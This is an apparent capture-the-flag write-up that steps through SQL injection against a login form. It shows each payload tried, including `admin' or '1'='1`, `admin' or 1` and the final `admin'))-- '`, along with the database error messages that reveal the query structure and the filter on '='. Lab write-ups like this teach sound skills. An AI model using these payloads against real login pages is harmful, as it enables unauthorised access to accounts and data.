1. try:username:`admin'` and password:123

* something like this:ERROR: `syntax error at or near "40" LINE 1: ...ers WHERE (username = ('admin'') AND password = ('40bd001563... ^`
e,,,nothing.

2. try it again:`admin' or '1'='1` and password:`123`

* get this:`Illegal characters detected.It like that '=' is illegal`.So,let's try again!

3. keep try:`admin' or 1` and password:`123`

* get this:ERROR: `syntax error at or near "') AND password = ('" LINE 1: ...LECT * FROM users WHERE (username = ('admin' or 1 ') AND pas... ^`

* Oh,that's amazing!Look at this:`"AND password = ('" LINE 1: ...LECT * FROM users WHERE (username = ('admin' or 1 ') AND pas...^"`.So, let's defeat it!

4. try:username:`admin')-- '` and password:`123`

* e,,,wrong?Long time passed! All right,there need double ')'.OK,let's try it again!

5. try:username:`admin'))-- '` and password:`123`

* Nice Job!Get the Flag.
